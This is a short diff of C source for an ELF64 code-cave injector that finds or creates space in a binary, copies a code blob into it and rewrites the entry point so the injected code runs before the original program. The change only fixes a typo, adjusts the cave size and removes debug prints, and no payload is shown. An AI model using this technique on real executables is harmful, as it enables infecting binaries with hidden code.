@@ -117,17 +117,14 @@ char *inject_code(char *file, off_t *file_size, Elf64_Shdr *section)
 	if (error)
 		return (NULL);
 	new_file = get_new_file(file, *file_size);
-	cave_entry = find_cave(file, *file_size, sizeof(code) , &cave_size, &offset_max);
+	cave_entry = find_cave(file, *file_size, sizeof(code) + 5 , &cave_size, &offset_max);
 	if (!cave_entry)
 	{
-		printf("creaing more place...\n");
+		printf("creating more place...\n");
 		cave_entry = make_place(&new_file, file_size, sizeof(code) - 1);
 		metamorph_segment(new_file, *file_size, cave_entry, sizeof(code) - 1, virt_addr);
-		}
-	printf("bigest cave entry: 0x%jx, cave size: 0x%jx\n", cave_entry, cave_size);
-	printf("Virtual address offset: 0x%jx\n", virt_addr);
+	}
 	cave_entry += virt_addr;
-	printf("Old entry: 0x%jx\nNew entry: 0x%jx\n", ((Elf64_Ehdr *)file)->e_entry, cave_entry);
 	// change the entry point
 	((Elf64_Ehdr *)new_file)->e_entry = cave_entry;
 	// copy the code to the cave and jump to the normal entry point
